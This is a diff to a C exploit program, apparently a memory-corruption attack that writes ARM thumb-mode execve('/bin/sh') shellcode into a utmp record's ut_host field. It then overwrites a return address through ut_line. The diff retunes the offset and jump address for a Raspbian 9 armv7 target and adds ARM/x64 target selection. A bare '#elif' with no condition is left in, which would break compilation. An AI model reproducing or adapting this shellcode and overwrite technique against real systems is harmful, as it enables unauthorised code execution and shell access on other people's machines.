@@ -50,13 +50,10 @@ struct Target target_rpi_armv7 = {
   .name = "Raspbian 9 armv7",
   .arch_size = 4,
   .sled = 0xe1a01001,
-  .ip_offset = 0x53,
-  .jmp = 0x7fffd8b8,
+  .ip_offset = 0x3b,
+  .jmp = 0x7efff25b,
   .shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78", //armv7 thumb-mode execve("/bin/sh") (https://azeria-labs.com/writing-arm-shellcode/)
 };
-
-//  int sled = 0xe1a01001;
-// "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78", // ARM execve("/bin/sh")
 
 int main(int argc, char **argv) {
 
@@ -67,7 +64,13 @@ int main(int argc, char **argv) {
   int sc_size;
   int ut_size;
   struct Target *target;
+#ifdef __arm__
+  fprintf(stderr, "Targeting ARM\n");
+  target = &target_rpi_armv7;
+#elif
+  fprintf(stderr, "Targeting x64\n");
   target = &target_debian10_x64;
+#endif
   
   fprintf(stderr, "Phantom stack around: %p\n", &ut);
   sc_size = strlen(target->shellcode); // ignores the null
@@ -77,9 +80,6 @@ int main(int argc, char **argv) {
 
   if (ut == NULL) return -1;
 
-  fprintf(stderr, "Allocated ut @ %p\n", ut);
-  fprintf(stderr, "size of ut_type: %p\n", sizeof(ut->ut_type));
-  fprintf(stderr, "size of ut_pid: %p\n", sizeof(ut->ut_pid));
   fprintf(stderr, "Distance to ut_line is: %d\n", ((void*)&(ut->ut_line)-(void*)ut));
   fprintf(stderr, "Distance to ut_tv is: %d\n", ((void*)&(ut->ut_tv)-(void*)ut));
 
@@ -91,7 +91,7 @@ int main(int argc, char **argv) {
 
   // Setup the shellcode mmkay 
   memcpy(&ut->ut_host[__UT_HOSTSIZE - sc_size], target->shellcode, sc_size);
-  fprintf(stderr, "setting rip at ut->ut_line + %d\n", (__UT_LINESIZE + target->arch_size * 2));
+  fprintf(stderr, "setting rip at ut->ut_line + 0x%x\n", (target->ip_offset));
   memcpy(&ut->ut_line[target->ip_offset], &target->jmp, target->arch_size);
 
   //Pre-flight checks
